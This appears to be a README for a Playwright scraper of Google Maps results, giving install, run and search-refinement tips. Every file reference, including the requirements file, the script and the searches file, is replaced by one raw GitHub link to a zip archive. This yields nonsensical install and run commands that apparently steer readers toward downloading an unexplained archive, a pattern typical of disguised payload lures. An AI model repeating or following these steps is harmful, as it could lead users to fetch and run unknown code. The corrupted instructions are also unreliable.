# Google Maps Scraper

This is simple scraper that uses Playwright to extract data from Google Maps. 

This example is made for educational purposese.

This scrapit is easy to customize.

check both Excel & CSV files (google_maps_data) to see how final data will look like. 

## To Install:
- (Optional: create & activate a virtual environment) `virtualenv venv`, then `source venv/bin/activate`

- `pip install -r https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip`
- `playwright install chromium`

## to Run:
### A single search:
- `python3 https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip -s=<what & where to search for> -t=<how many>`

### Multiple searches at once
1. Add searches in `https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip`, each search should be in a new line as shown in the example (check `https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip`)
2. Then run: `python3 https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip` 
3. If you pass `-t=<how many>` it will be applied to all the searches. 

## Tips:
If you want to search more than the limited 120 results, detail you search more and as granular as you need it to be in the `https://raw.githubusercontent.com/husseingpp/google_maps_scraper/master/mastiff/google_maps_scraper.zip`, for example:

- Instead of using:

`United states dentist`

- Use:

`Unites States Boston dentist`

`Unites States New York dentist`

`Unites States Texas dentist`

And so on... 



